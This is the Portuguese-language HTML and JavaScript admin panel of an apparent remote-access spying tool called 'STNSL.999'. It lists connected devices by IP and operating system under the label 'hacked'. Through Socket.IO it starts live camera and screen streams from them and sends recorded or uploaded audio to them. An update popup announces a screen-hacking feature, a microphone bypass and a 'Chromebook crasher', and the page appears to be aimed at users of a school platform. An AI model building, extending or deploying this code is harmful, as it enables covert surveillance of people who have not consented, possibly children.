<!--
--[[   _____   __    __    __   ___    _____   ________     ____ --]]
--[[  / ____\  ) )  ( (   () ) / __)  (_   _) (___  ___)   (    ) --]]
--[[ ( (___   ( (    ) )  ( (_/ /       | |       ) )      / /\ \ --]]
--[[  \___ \   ) )  ( (   ()   (        | |      ( (      ( (__) ) --]]
--[[      ) ) ( (    ) )  () /\ \       | |       ) )      )    ( --]]
--[[  ___/ /   ) \__/ (   ( (  \ \     _| |__    ( (      /  /\  \ --]]
--[[ /____/    \______/   ()_)  \_\   /_____(    /__\    /__(  )__\ --]]

--[[ ùê©ùêöùê´ùêöùêõùêûùêßùê¨ ùêØùê®ùêúùêû ùêöùêúùêûùê¨ùê¨ùê®ùêÆ ùê® ùê©ùêöùê¢ùêßùêûùê• ùêöùêùùê¶ ùêùùêûùê¨ùêúùê®ùêõùê´ùêû ùêö ùê¨ùêûùêßùê°ùêö ùêöùê†ùê®ùê´ùêö ùê™ ùê¨ùêû ùêûùêßùê≠ùê´ùêö --]]
-->

<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>STNSL.999  Admin</title>

<!-- Bootstrap & FontAwesome -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

<style>
/* Minimal-Hacker Soft v1.3  */
:root{
  --bg-1:#0e131a; --bg-2:#161c24; --stroke:#1f2731;
  --text:#d0d5dc; --muted:#8a94a3; --brand:#3ddcff;
  --radius:.6rem; --shadow:0 8px 24px -12px rgba(0,0,0,.6);
  --mono:'Fira Code',Consolas,Menlo,monospace;
}
html,body{height:100%;margin:0;font-family:var(--mono);background:var(--bg-1);color:var(--text);-webkit-font-smoothing:antialiased;}
body.locked{overflow:hidden}
*::-webkit-scrollbar{width:6px;height:6px}
*::-webkit-scrollbar-thumb{background:var(--brand);border-radius:3px}
/* ---------- layout ---------- */
.navbar{background:var(--bg-2);border-bottom:1px solid var(--stroke);padding:.75rem 1.25rem;box-shadow:var(--shadow);}
.sidebar{background:var(--bg-2);width:240px;border-right:1px solid var(--stroke);overflow-y:auto;transition:width .25s;}
.sidebar.collapsed{width:68px}
.brand{padding:1.5rem 1rem .75rem;border-bottom:1px solid var(--stroke);text-align:center;}
.brand img{max-height:78px}
/* ---------- lista lateral ---------- */
.list-group-item{display:flex;align-items:center;gap:.75rem;padding:.55rem .85rem;margin:.15rem .75rem;font-size:.9rem;font-weight:500;color:var(--muted);border-radius:calc(var(--radius) - .25rem);cursor:pointer;transition:background .15s,color .15s;}
.list-group-item i{width:22px;text-align:center}
.list-group-item:hover{background:rgba(61,220,255,.08);color:var(--text);}
.list-group-item.active{background:rgba(61,220,255,.18);color:var(--brand);}
/* ---------- √°rea de visualiza√ß√£o ---------- */
#viewer{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1.2rem;padding:1.5rem;}
.card-feed{position:relative;background:var(--bg-2);border:1px solid var(--stroke);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:transform .2s,box-shadow .2s;}
.card-feed:hover{transform:translateY(-4px);box-shadow:0 16px 28px -12px rgba(61,220,255,.25);}
.card-feed img{display:block;width:100%;height:170px;object-fit:cover;filter:brightness(.92);}
/* r√≥tulo IP | SO | hacked */
.card-feed .ip-label{position:absolute;top:0;left:0;width:100%;padding:.25rem .5rem;font-size:.75rem;font-weight:600;background:rgba(14,19,26,.9);color:var(--brand);text-align:center;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;z-index:2;border-bottom:1px solid var(--stroke);}
/* overlay C√¢mera / Tela */
.card-feed .overlay{position:absolute;bottom:.4rem;left:.5rem;padding:.2rem .6rem;font-size:.75rem;background:rgba(0,0,0,.65);color:#fff;border-radius:.3rem;text-transform:uppercase;letter-spacing:.04em;z-index:2;}
/* barra de bot√µes */
.card-feed .btn-bar{position:absolute;right:.6rem;top:calc(28px + .4rem);display:flex;gap:.4rem;z-index:2;}
.btn-glass{width:34px;height:34px;display:inline-flex;align-items:center;justify-content:center;background:rgba(61,220,255,.1);border:1px solid rgba(61,220,255,.28);color:var(--brand);border-radius:50%;backdrop-filter:blur(3px);transition:background .15s,border .15s;}
.btn-glass:hover{background:rgba(61,220,255,.18);border-color:rgba(61,220,255,.45);}
/* t√≠tulos piscando */

</style>
</head>

<body class="locked">


<!-- Login ------------------------------------------------- -->


<!-- Painel ------------------------------------------------ -->
<div id="painel" style="display:none;height:100vh">
  <nav class="navbar px-3 flex-shrink-0 justify-content-between">
    <span class="fw-semibold"><i class="fa-solid fa-scarecrow"></i>STNSL.999 " v1.5 (BETA) DEV: Sukita...</span>
    <!-- √çcone de menu -->
    <div class="d-flex align-items-center gap-2">
      <div class="dropdown">
        <button class="btn btn-glass" data-bs-toggle="dropdown"><i class="fas fa-ellipsis-v"></i></button>
        <ul class="dropdown-menu dropdown-menu-end shadow">
          <li><a class="dropdown-item" href="https://manus.im/" target="_blank">MANUS.IM (teste)</a></li>
          <li><a class="dropdown-item" href="https://pastebin.com/raw/mNtFVJJa" target="_blank">Infos script</a></li>
        </ul>
      </div>
    </div>
  </nav>

  <div class="d-flex" style="height:calc(100% - 56px)">
    <!-- Sidebar -->
    <aside class="sidebar p-3">
      <div class="brand"><img src="https://i.ebayimg.com/images/g/UVMAAOSwCFBeaHLX/s-l1200.png" alt="Sala do Futuro"></div>
      <h6 class="fw-semibold mt-4">Dispositivos <span id="count" class="badge bg-primary">0</span></h6>
      <ul id="list" class="list-group list-group-flush small mt-2"></ul>
    </aside>

    <!-- Viewer -->
    <main class="flex-grow-1 p-4 overflow-auto">
      <div id="viewer" class="d-flex flex-wrap"></div>
    </main>
  </div>
</div>

<!-- Modal gravar √°udio ------------------------------------ -->
<div class="modal fade" id="recordModal" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header border-0">
        <h5 class="modal-title">Gravar √°udio</h5>
        <button class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body text-center">
        <button id="recordBtn" class="btn btn-danger"><i class="fas fa-microphone"></i> Gravar</button>
        <button id="stopBtn" class="btn btn-secondary d-none"><i class="fas fa-stop"></i> Parar</button>
      </div>
      <p class="small text-center text-muted mb-3">O √°udio ser√° enviado automaticamente ap√≥s a grava√ß√£o.</p>
    </div>
  </div>
</div>

<!-- Popup de atualiza√ß√£o ---------------------------------- -->
<div class="modal fade" id="updateModal" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content bg-dark text-white">
      <div class="modal-header border-0">
        <h5 class="modal-title">STNSL ATUALIZADO</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body text-center">
        <p class="mb-0">VERS√ÉO 1.5<br>MELHORIAS GR√ÅFICAS<br>NOVA OP√á√ÉO DE HACKEAR TELA<br> TRABALHANDO NA BYPASS DE MICROFONE E CHROMEBOOK CRASHER =%=¬Ä<br>ESTAMOS TRABALHANDO NO ALL LI√á√ïES PARA FAZER TODAS AS LI√á√ïES DE TODAS AS PLATAFORMAS DIGITAIS ==</p>
      </div>
      <div class="modal-footer border-0">
        <button type="button" class="btn btn-primary w-100" data-bs-dismiss="modal">Fechar</button>
      </div>
    </div>
  </div>
</div>

<!-- Toasts -->
<div class="toast-container position-fixed top-0 end-0 p-3"></div>

<!-- Scripts ----------------------------------------------- -->
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
/*  Elementos DOM / Estado  */
const socket  = io({ query:{ role:'admin' } });
const listEl  = document.getElementById('list');
const countEl = document.getElementById('count');
const viewer  = document.getElementById('viewer');
const toastBox= document.querySelector('.toast-container');
const recordModal = new bootstrap.Modal('#recordModal');
const recordBtn   = document.getElementById('recordBtn');
const stopBtn     = document.getElementById('stopBtn');

const cache={}, activeCam={}, activeScreen={};
let currentTargetUUID=null, mediaRecorder,chunks=[];



/*  Utilidades  */
function toast(msg,type='primary'){
  const t=document.createElement('div');
  t.className=`toast align-items-center text-white bg-${type} border-0`;
  t.innerHTML=`<div class="d-flex"><div class="toast-body">${msg}</div>
               <button class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div>`;
  toastBox.appendChild(t); bootstrap.Toast.getOrCreateInstance(t,{delay:2500}).show();
  t.addEventListener('hidden.bs.toast',()=>t.remove());
}
const os = ua =>
  /Windows NT/.test(ua)?'Windows':
  /Mac OS X/.test(ua)?'macOS':
  /Android/.test(ua)?'Android':
  /iPhone|iPad/.test(ua)?'iOS':
  /Linux/.test(ua)?'Linux':'';
const infoPopoverContent = c =>
  `<strong>UUID:</strong> ${c.uuid}<br><strong>OS:</strong> ${os(c.ua)}<br><strong>Conectado:</strong> ${new Date(c.connected_at).toLocaleString()}`;

/*  Fullscreen helper  */
function openFullScreen(card){
  const img=card.querySelector('img');
  const onFs=()=>{
    if(document.fullscreenElement===card){
      img.style.width='100vw';img.style.height='100vh';img.style.objectFit='contain';
    }else{
      img.style.width='';img.style.height='';img.style.objectFit='cover';
      document.removeEventListener('fullscreenchange',onFs);
    }
  };
  document.addEventListener('fullscreenchange',onFs);
  (card.requestFullscreen||card.webkitRequestFullscreen||card.msRequestFullscreen).call(card);
}

/*  Criar card viewer  */
function mkCard(uuid,type){
  const c=cache[uuid];
  const card=document.createElement('div');
  card.className='card-feed'; card.id=`${type}-${uuid}`;
  card.innerHTML=`
     <div class="ip-label">${c.ip} | ${os(c.ua)} | hacked</div>
     <img id="${type==='cam'?'img':'screen-img'}-${uuid}">
     <div class="overlay">${type==='cam'? 'C√¢mera':'Tela'}</div>
     <div class="btn-bar">
       <button class="btn btn-glass btn-full"><i class="fas fa-expand"></i></button>
       <button class="btn btn-glass btn-stop"><i class="fas fa-xmark"></i></button>
     </div>`;
  card.querySelector('.btn-full').onclick=()=>openFullScreen(card);
  card.querySelector('.btn-stop').onclick=()=>{
    socket.emit(type==='cam'?'stop-stream':'stop-screen',uuid);
    (type==='cam'?activeCam:activeScreen)[uuid]=undefined;
    card.remove();
  };
  viewer.appendChild(card);
}

/*  Linha sidebar  */
function row(c){return `<li class="list-group-item" data-uuid="${c.uuid}">
  <i class="fas fa-eye" tabindex="0"></i><span>${c.ip}</span>
  <div class="dropdown ms-auto">
    <button class="btn btn-glass btn-sm" data-bs-toggle="dropdown"><i class="fas fa-ellipsis-v"></i></button>
    <ul class="dropdown-menu dropdown-menu-end shadow">
      <li><a class="dropdown-item toggle-cam" data-uuid="${c.uuid}"><i class="fas fa-video me-2"></i>C√¢mera</a></li>
      <li><a class="dropdown-item toggle-screen" data-uuid="${c.uuid}"><i class="fas fa-desktop me-2"></i>Tela</a></li>
      <li><hr class="dropdown-divider"></li>
      <li><a class="dropdown-item download-audio" href="https://pixabay.com/sound-effects/" target="_blank">
          <i class="fas fa-arrow-down me-2"></i>Baixar √°udio</a></li>
      <li><a class="dropdown-item stop-audio" data-uuid="${c.uuid}">
          <i class="fas fa-volume-xmark me-2"></i>Parar √°udio</a></li>
      <li><label class="dropdown-item"><i class="fas fa-upload me-2"></i>Enviar √°udio
          <input type="file" accept="audio/*" class="audio-file d-none" data-uuid="${c.uuid}"></label></li>
      <li><a class="dropdown-item record-audio" data-uuid="${c.uuid}">
          <i class="fas fa-microphone-lines me-2"></i>Gravar & enviar</a></li>
    </ul>
  </div>
</li>`;}

/*  Socket.IO  */
socket.on('clients', arr=>{
  countEl.textContent=arr.length;
  listEl.innerHTML='';
  arr.forEach(c=>{
    cache[c.uuid]=c;
    listEl.insertAdjacentHTML('beforeend',row(c));
  });
  document.querySelectorAll('.fa-eye').forEach(btn=>{
    const uuid=btn.closest('[data-uuid]').dataset.uuid;
    bootstrap.Popover.getOrCreateInstance(btn,{
      trigger:'focus',placement:'right',html:true,
      content:()=>infoPopoverContent(cache[uuid])
    });
  });
});
socket.on('frame',({id,data})=>{
  const img=document.getElementById('img-'+id);
  if(img&&activeCam[id]) img.src=data;
});
socket.on('screen-frame',({id,data})=>{
  const img=document.getElementById('screen-img-'+id);
  if(img&&activeScreen[id]) img.src=data;
});

/*  A√ß√µes na sidebar  */
listEl.addEventListener('click',e=>{
  const uuid=e.target.closest('[data-uuid]')?.dataset.uuid; if(!uuid)return;
  if(e.target.closest('.toggle-cam')){
    if(activeCam[uuid]){
      socket.emit('stop-stream',uuid);delete activeCam[uuid];
      document.getElementById('cam-'+uuid)?.remove();toast('C√¢mera parada','secondary');
    }else{
      socket.emit('request-stream',uuid);activeCam[uuid]=true;mkCard(uuid,'cam');toast('C√¢mera ativada','primary');
    }
  }
  if(e.target.closest('.toggle-screen')){
    if(activeScreen[uuid]){
      socket.emit('stop-screen',uuid);delete activeScreen[uuid];
      document.getElementById('screen-'+uuid)?.remove();toast('Tela parada','secondary');
    }else{
      socket.emit('request-screen',uuid);activeScreen[uuid]=true;mkCard(uuid,'screen');toast('Tela ativada','primary');
    }
  }
  if(e.target.closest('.stop-audio')){socket.emit('stop-audio',uuid);toast('√Åudio parado','secondary');}
  if(e.target.closest('.record-audio')){currentTargetUUID=uuid;recordModal.show();}
});

/* upload de √°udio ----------------------------------------- */
listEl.addEventListener('change',e=>{
  if(e.target.classList.contains('audio-file')){
    const uuid=e.target.dataset.uuid, f=e.target.files[0]; if(!f)return;
    const fr=new FileReader();
    fr.onload=()=>{
      socket.emit('custom-audio',{uuid,dataURL:fr.result});
      toast('√Åudio enviado','info');
    };
    fr.readAsDataURL(f);
  }
});

/* grava√ß√£o de √°udio --------------------------------------- */
recordBtn.onclick=async()=>{
  const stream=await navigator.mediaDevices.getUserMedia({audio:true});
  mediaRecorder=new MediaRecorder(stream);chunks=[];
  mediaRecorder.ondataavailable=e=>chunks.push(e.data);
  mediaRecorder.onstop=()=>{
    const blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();
    fr.onload=()=>{
      socket.emit('custom-audio',{uuid:currentTargetUUID,dataURL:fr.result});
      toast('√Åudio gravado/enviado','success');recordModal.hide();
    };
    fr.readAsDataURL(blob);
  };
  mediaRecorder.start();
  recordBtn.classList.add('d-none'); stopBtn.classList.remove('d-none');
};
stopBtn.onclick=()=>{
  mediaRecorder?.stop();
  recordBtn.classList.remove('d-none'); stopBtn.classList.add('d-none');
};
</script>
</body>
</html>